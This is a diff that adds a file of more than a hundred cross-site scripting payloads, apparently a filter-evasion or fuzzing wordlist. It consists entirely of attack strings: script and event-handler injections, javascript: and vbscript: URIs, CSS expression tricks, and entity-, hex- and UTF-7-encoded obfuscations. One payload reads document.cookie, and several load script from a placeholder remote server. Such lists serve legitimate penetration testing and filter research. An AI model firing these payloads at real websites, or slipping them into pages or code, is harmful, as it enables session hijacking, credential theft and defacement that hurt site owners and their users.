@@ -1,0 +1,124 @@
+¼script¾alert(¢42¢)¼/script¾
+'%3CIFRAME%20SRC=javascript:alert(%25271%2527)%3E%3C/IFRAME%3E
+%3cscript%3ealert(1);%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+%3cscript%3ealert("4");%3c/script%3e
+'';!--"<54>=&{()}
+'';!--"<55>=&{()}
+\";alert('21');//
+\";alert('7');//
+\";alert('8');//
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
+<BASE HREF="javascript:alert('55');//">
+<BGSOUND SRC="javascript:alert('32');">
+<BODY BACKGROUND="javascript:alert('25')">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("18")>
+<BODY ONLOAD=alert('31')>
+<BR SIZE="&{alert('33')}">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:alert('52'))">
+<DIV STYLE="background-image: url(javascript:alert('10'))">
+<DIV STYLE="background-image: url(javascript:alert('51'))">
+<DIV STYLE="width: expression(alert('11'));">
+<DIV STYLE="width: expression(alert('53'));">
+<? echo('<SCR)';echo('IPT>alert("57")</SCRIPT>'); ?>
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("37"))'>
+<FRAMESET><FRAME SRC="javascript:alert('48');"></FRAMESET>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('59');+ADw-/SCRIPT+AD4-
+<!--[if gte IE 4]><SCRIPT>alert('54');</SCRIPT><![endif]-->
+<IFRAME SRC="javascript:alert('46');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert('47')"></IFRAME>
+<IMG%20DYNSRC="javascript:alert('12')">
+<IMG%20LOWSRC="javascript:alert('13')">
+<IMG%20"""><SCRIPT>alert("14")</SCRIPT>">
+<IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG%20SRC="%20&#14;%20javascript:alert('17');">
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG%20SRC='javasc	ript:alert(1)'>
+<IMG%20SRC='javascript:alert(1)'>
+<IMG%20SRC="jav	ascript:alert('23');">
+<IMG%20SRC="javascript:alert('24')"
+<IMG%20SRC="javascript:alert('25');">
+<IMG%20SRC=`javascript:alert("'26'")`>
+<IMG%20SRC=javascript:alert('27')>
+<IMG%20SRC=JaVaScRiPt:alert('28')>
+<IMG%20SRC=javascript:alert(&quot;21&quot;)>
+<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG%20SRC="jav&#x09;ascript:alert('29');">
+<IMG%20SRC="jav&#x0A;ascript:alert('30');">
+<IMG%20SRC="jav&#x0D;ascript:alert('31');">
+<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG DYNSRC="javascript:alert('26')">
+<IMG LOWSRC="javascript:alert('27')">
+<IMG onmouseover="alert('10')">
+<IMG """><SCRIPT>alert("33")</SCRIPT>">
+<IMG """><SCRIPT>alert("6")</SCRIPT>">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=" &#14;  javascript:alert('17');">
+<IMG SRC=" &#14;  javascript:alert('34');">
+<IMG SRC="jav	ascript:alert('12');">
+<IMG SRC="javascript:alert('2');">
+<IMG SRC="javascript:alert('20')"
+<IMG SRC=javascript:alert('3')>
+<IMG SRC="javascript:alert('35');">
+<IMG SRC=javascript:alert('36')>
+<IMG SRC=JaVaScRiPt:alert('37')>
+<IMG SRC=JaVaScRiPt:alert('4')>
+<IMG SRC=javascript:alert(&quot;5&quot;)>
+<IMG SRC=`javascript:alert("RSnake says, '5'")`>
+<IMG SRC=javascript:alert(String.fromCharCode(55))>
+<IMG SRC=javascrscriptipt:alert('38')>
+<IMG SRC="jav&#x09;ascript:alert('13');">
+<IMG SRC="jav&#x0A;ascript:alert('14');">
+<IMG SRC="jav&#x0D;ascript:alert('15');">
+<IMG SRC=/ onerror="alert(String.fromCharCode(49,49))"></img>
+<IMG SRC=# onmouseover="alert('8')">
+<IMG SRC= onmouseover="alert('9')">
+<IMG SRC='vbscript:msgbox("29")'>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('36'))">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('24');">
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<LINK REL="stylesheet" HREF="javascript:alert('34');">
+&ltscript&gtalert(1);&ltscript&gtalert
+&ltscript&gtalert(1);</script>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnNDQnKTwvc2NyaXB0Pgo=">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('43');">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('58')</SCRIPT>">
+perl -e 'print "<IMG SRC=java\0script:alert(\"16\")>";' > out
+"><script>"
+<SCRIPT>a=/48/alert(a.source)</SCRIPT>
+<<SCRIPT>alert("19");//<</SCRIPT>
+'><script>alert(1);</script>
+'><script>alert(1)</script>
+<script>alert(1)</script>
+<<script>alert("45");//<</script>
+<script>alert("46")</script>
+<<SCRIPT>alert("47");//<</SCRIPT>
+<SCRIPT "a='>'" SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
+<SCRIPT a=">" SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
+<SCRIPT a=`>` SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
+</script><script>alert('22');</script>
+//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<SCRIPT =">" SRC="httx://<remoteServer>/xss/dfaswe4785zw30845thctwd3407504.js"></SCRIPT>
+<STYLE>@im\port'\ja\vasc\ript:alert("35")';</STYLE>
+<STYLE>li {list-style-image: url("javascript:alert('28')");}</STYLE><UL><LI>XSS</br>
+<STYLE type="text/css">BODY{background:url("javascript:alert('40')")}</STYLE>
+<STYLE TYPE="text/javascript">alert('38');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('39')");}</STYLE><A CLASS=XSS></A>
+<svg/onload=alert('30')>
+<TABLE BACKGROUND="javascript:alert('49')">
+<TABLE><TD BACKGROUND="javascript:alert('50')">
+<TABLE><TD BACKGROUND="javascript:alert('56')">
+</TITLE><SCRIPT>alert("23");</SCRIPT>
+</TITLE><SCRIPT>alert("57");</SCRIPT>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('56')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<xss><script>alert('58')</script></vulnerable>
+<XSS STYLE="xss:expression(alert('41'))">
